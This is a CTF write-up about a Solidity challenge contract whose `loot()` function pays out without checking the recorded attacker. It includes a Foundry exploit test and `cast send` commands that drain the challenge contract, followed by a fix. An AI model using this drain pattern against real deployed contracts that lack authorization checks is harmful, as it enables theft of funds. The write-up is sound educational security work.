<div align="center">

# Survival of the Fittest

### A Solidity access-control writeup

![Category](https://img.shields.io/badge/category-Blockchain-blue)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-brightgreen)
![Solidity](https://img.shields.io/badge/solidity-%5E0.8.13-363636)
![Tool](https://img.shields.io/badge/tool-Foundry-orange)
![Vuln](https://img.shields.io/badge/vuln-missing%20access%20control-red)
![Flag](https://img.shields.io/badge/flag-redacted-lightgrey)

</div>

---

> [!NOTE]
> **TL;DR**: `Creature.loot()` pays out to whoever calls it once `lifePoints == 0`, without checking who actually dealt the killing blow. `strongAttack()` lets anyone deal arbitrary damage in one shot. Two transactions, no attacker contract needed, no flag included in this writeup.

Tagged as a warm-up and it plays like one, but it's a good example of a bug that shows up constantly in real audits: a contract that *tracks* who's allowed to do something and then just... doesn't check it.

**Goal**, straight from the setup contract: get `Creature`'s balance down to zero.

## Table of Contents

- [Reading Setup.sol first](#reading-setupsol-first)
- [The target contract](#the-target-contract)
- [The bug](#the-bug-in-one-line)
- [Exploit](#exploit)
  - [Sanity-checking it locally first](#sanity-checking-it-locally-first)
  - [Talking to the live instance](#talking-to-the-live-instance)
- [Checking it actually worked](#checking-it-actually-worked)
- [Root cause & fix](#why-this-happens--how-youd-fix-it)

---

## Reading Setup.sol first

I always start here instead of the actual target, because it just tells you the win condition instead of making you guess.

```solidity
contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

Not much to it. `isSolved()` only cares about `address(TARGET).balance == 0`, nothing else. Kind of funny that the constructor takes a whole ether but only 10 wei of it actually makes it into `Creature`: the rest just sits in `Setup` forever, doesn't matter for anything. I assume that's just there to make the "loot" theme feel like it has stakes, or it's a leftover from an earlier version of the challenge. Either way, not our problem.

Also worth noting `TARGET` is `public`, so you don't need `connection_info` to find the target address: you can just call `Setup.TARGET()`.

## The target contract

```solidity
contract Creature {

    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }

    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

Small enough to just go function by function.

| Function | Who can call it | What it actually checks | Why it matters |
|---|---|---|---|
| `punch()` | anyone |: | fixed 1 damage, not interesting |
| `strongAttack(_damage)` | anyone |: | **caller picks the damage**, no cap, no cooldown |
| `loot()` | anyone | `lifePoints == 0` | pays out full balance, **never checks `aggro`** |
| `_dealDamage()` | internal |: | records `msg.sender` into `aggro`, then subtracts |

Here's the thing that gives the challenge its name: there's an `aggro` variable that clearly exists to record who last hit the creature, presumably so that whoever "wins the fight" gets to loot it. Except `loot()` never actually reads `aggro`. It checks `lifePoints == 0` and hands the money to `msg.sender`, full stop. Doesn't matter if you're the one who killed it or not.

> [!TIP]
> One thing worth double-checking on any Solidity ≥ 0.8 target: does `lifePoints -= _damage` underflow if you overshoot? It doesn't: built-in arithmetic checks make an overshoot just revert instead of wrapping to a huge number. Not that it matters here, since you can deal exactly `20` in one call and land on zero.

## The bug, in one line

`strongAttack` lets anyone deal arbitrary damage, and `loot` lets anyone claim the reward once the creature's dead: regardless of who actually killed it. The `aggro` bookkeeping is basically decoration. There's no `require(msg.sender == aggro)`, no modifier, nothing tying the kill to the payout.

**Classification:** Missing access control on a privileged action ([CWE-284](https://cwe.mitre.org/data/definitions/284.html)), same family as [SWC-105](https://swcregistry.io/docs/SWC-105/) (Unprotected Ether Withdrawal): the withdrawal itself isn't unprotected in the "anyone can drain it anytime" sense, but the *authorization check* it's supposed to have (last attacker only) is simply missing.

Which means you don't even have to be "the fittest" in any real sense. You just need to be whoever calls `loot()` after `lifePoints` hits zero: whether or not you were the one attacking.

## Exploit

Two calls, from any account with a little gas to spend:

1. `strongAttack(20)`: one shot, `lifePoints` goes straight to 0.
2. `loot()`: drains the balance to whoever calls it.

No need to write an attacker contract for this: both functions are plain `external` with no restrictions, so a wallet calling them directly is enough.

### Sanity-checking it locally first

Before poking the live instance I like to reproduce it in a throwaway Foundry project, mostly to make sure I'm not missing some detail (and to prove the `aggro` field really is unused, not just unused in the happy path).

```bash
forge init --no-git .
cp Setup.sol Creature.sol src/
```

<details>
<summary><code>test/Exploit.t.sol</code>: click to expand</summary>

```solidity
import {Test} from "forge-std/Test.sol";
import {Setup} from "../src/Setup.sol";
import {Creature} from "../src/Creature.sol";

contract ExploitTest is Test {
    Setup setup;
    Creature target;

    function setUp() public {
        setup = new Setup{value: 1 ether}();
        target = setup.TARGET();
    }

    function testExploit() public {
        assertFalse(setup.isSolved());

        target.strongAttack(20);
        assertEq(target.lifePoints(), 0);

        // deliberately a different address than the one that attacked
        vm.prank(address(0xBEEF));
        target.loot();

        assertEq(address(target).balance, 0);
        assertTrue(setup.isSolved());
    }
}
```

</details>

```console
$ forge test -vvv
[PASS] testExploit() (gas: 72927)
```

The fact that `0xBEEF` (who never called `strongAttack`) can still loot confirms `aggro` isn't actually enforced anywhere.

### Talking to the live instance

The challenge runs behind a small web wrapper. Poking around the `/docs` page and the endpoints, here's what's available:

| Endpoint | Purpose |
|---|---|
| `GET /connection_info` | private key, your address, `Setup` address, `Creature`/target address (JSON) |
| `POST /rpc` | standard Ethereum JSON-RPC, works fine with `cast` |
| `GET /flag` | hands you the flag once solved: **also resets the chain** |
| `GET /restart` | resets the chain without restarting the whole container |

> [!WARNING]
> Don't hit `/flag` until you're actually done poking around: it resets the chain, so you'd have to redo the exploit to demo it again.

Grab the connection info and check the state before touching anything:

```bash
curl -s http://<host>:<port>/connection_info

RPC="http://<host>:<port>/rpc"
SETUP="<setupAddress>"

cast call $SETUP "TARGET()(address)" --rpc-url $RPC
cast call $SETUP "isSolved()(bool)"  --rpc-url $RPC
```

Then just run the two calls:

```bash
RPC="http://<host>:<port>/rpc"
PK="<PrivateKey>"
TARGET="<TargetAddress>"

# what are we working with
cast call $TARGET "lifePoints()(uint256)" --rpc-url $RPC
cast balance $TARGET --rpc-url $RPC

# kill it
cast send $TARGET "strongAttack(uint256)" 20 --rpc-url $RPC --private-key $PK

# take the money (nobody's checking aggro here)
cast send $TARGET "loot()" --rpc-url $RPC --private-key $PK
```

Both come back `status 1 (success)`.

## Checking it actually worked

```bash
cast balance $TARGET --rpc-url $RPC                 # -> 0
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC   # -> true
```

Once that flips to `true`, you're done.

## Why this happens / how you'd fix it

The root issue is pretty simple once you see it: the contract stores *who should* get paid (`aggro`), but the function that actually pays out never reads that variable. Add on top of that a damage function with zero limits, and any single account can both cause the death and immediately grab the reward: there's no actual "fight" happening.

A fix would look something like:

```diff
+   uint256 public constant MAX_STRONG_ATTACK_DAMAGE = 5;

    function strongAttack(uint256 _damage) external {
+       require(_damage <= MAX_STRONG_ATTACK_DAMAGE, "Damage too high");
        _dealDamage(_damage);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
+       require(msg.sender == aggro, "You didn't land the killing blow");
        payable(msg.sender).transfer(address(this).balance);
    }
```

Generalizing this a bit beyond the challenge: any time a contract keeps a variable around specifically to answer "who is allowed to do X later," it's worth grepping every sensitive function to make sure that variable is actually *read* somewhere, not just written. Storing the right data and enforcing it are two different things, and it's the second one people forget.

---

<div align="center">

`solidity` · `smart-contracts` · `access-control` · `ctf-writeup` · `foundry`

*Writeup for personal/educational purposes. No flag is included above: solve it yourself.*

</div>
